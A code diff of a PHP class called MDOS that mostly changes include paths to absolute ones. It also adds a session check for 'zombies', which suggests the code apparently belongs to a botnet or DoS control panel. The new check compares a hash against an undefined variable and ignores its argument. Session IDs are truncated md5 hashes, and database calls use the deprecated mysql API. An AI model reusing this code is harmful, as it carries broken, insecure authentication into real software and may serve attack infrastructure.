@@ -1,8 +1,8 @@
 <?php
 	class MDOS {
 		function HTMLPrintIndex($error) {
-			include 'static/config.php';
-			$fwd = 'template/'.$default_theme.'/htmlcontent/index.html';
+			include dirname(__FILE__).'/../static/config.php';
+			$fwd = dirname(__FILE__).'/../template/'.$default_theme.'/htmlcontent/index.html';
 			$content = read_file($fwd);
 			$md_d1 = str_replace ("%url%", $url, $content);
 			$md_d2 = str_replace ("%default_theme%", $default_theme, $md_d1);
@@ -16,9 +16,9 @@
 			echo $md_d2;
 		}
 		function HTMLPrintUser($info_sid, $info_log, $tab, $logdata = "") {
-			include 'static/config.php';
-			$content = read_file ('template/'.$default_theme.'/htmlcontent/user.html');
-			$tabcontent = read_file ('template/'.$default_theme.'/htmlcontent/user'.$tab.'.html');
+			include dirname(__FILE__).'/../static/config.php';
+			$content = read_file (dirname(__FILE__).'/../template/'.$default_theme.'/htmlcontent/user.html');
+			$tabcontent = read_file (dirname(__FILE__).'/../template/'.$default_theme.'/htmlcontent/user'.$tab.'.html');
 			$md_d1 = str_replace ("%tab%", $tabcontent, $content);
 			$md_d2 = str_replace ("%url%", $url, $md_d1);
 			$md_d3 = str_replace ("%default_theme%", $default_theme, $md_d2);
@@ -30,12 +30,14 @@
 			echo $md_d5;
 		}
 		function WriteLog ($ip, $type, $data) {
+			include dirname(__FILE__).'/../static/config.php';
 			$d_date = (date("d"))."/".(date("m"))." ".(date("H")).":".(date("i"));
 			$s_string = ($d_date.'|'.$type.'|'.$ip.'|'.$data);
-			file_put_contents ("task/rawlog/rawlog.txt", $s_string."\n", FILE_APPEND);
+			$fpath = (dirname(__FILE__).'/../task/rawlog/rawlog.txt');
+			file_put_contents ($fpath, $s_string."\n", FILE_APPEND);
 		}
 		function DBTryConnect ($log, $pass) {
-			include 'static/config.php';
+			include dirname(__FILE__).'/../static/config.php';
 			$login = $log;
 			$passwd = $pass;
 			$link = mysql_connect($mysql_host, $mysql_log, $mysql_mdp);
@@ -51,7 +53,7 @@
 			}
 		}
 		function DBGetMDP ($logx) {
-			include 'static/config.php';
+			include dirname(__FILE__).'/../static/config.php';
 			$conn = $logx;
 			$link = mysql_connect($mysql_host, $mysql_log, $mysql_mdp);
 			mysql_select_db($mysql_dbname, $link);
@@ -62,7 +64,7 @@
 			return $result;
 		}
 		function DBCheckLog ($log) {
-			include 'static/config.php';
+			include dirname(__FILE__).'/../static/config.php';
 			$login = $log;
 			$link = mysql_connect($mysql_host, $mysql_log, $mysql_mdp);
 			mysql_select_db($mysql_dbname, $link);
@@ -77,7 +79,7 @@
 			}
 		}
 		function SecureCheckSID ($sid, $mdp) {
-			include 'static/config.php';
+			include dirname(__FILE__).'/../static/config.php';
 			$session = (date("z")).(date("d")).(date("g")).(date("f"));
 			$string = ($mdp.$_SERVER['REMOTE_ADDR'].$salt.$session);
 			$subsid = md5($string);
@@ -90,12 +92,25 @@
 			}
 		}
 		function SecureCalcSID ($info_mdp) {
-			include 'static/config.php';
+			include dirname(__FILE__).'/../static/config.php';
 			$session = (date("z")).(date("d")).(date("g")).(date("f"));
 			$string = ($info_mdp.$_SERVER['REMOTE_ADDR'].$salt.$session);
 			$subsid = md5($string);
 			$sid = substr ($subsid, 0, 6);
 			return $sid;
+		}
+		function SecureCheckZombSID ($sid) {
+			include dirname(__FILE__).'/../static/config.php';
+			$s = $salt;
+			$u = $url;
+			$string = ($s.(strrev($u))) ;
+			$sidx = md5($string);
+			if ($sidx == $g) {
+				return True;
+			}
+			else {
+				return False;
+			}
 		}
 		function SecureRedirect ($direct) {
 		    if (isset($_SERVER['HTTP_USER_AGENT']) && (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false)) {
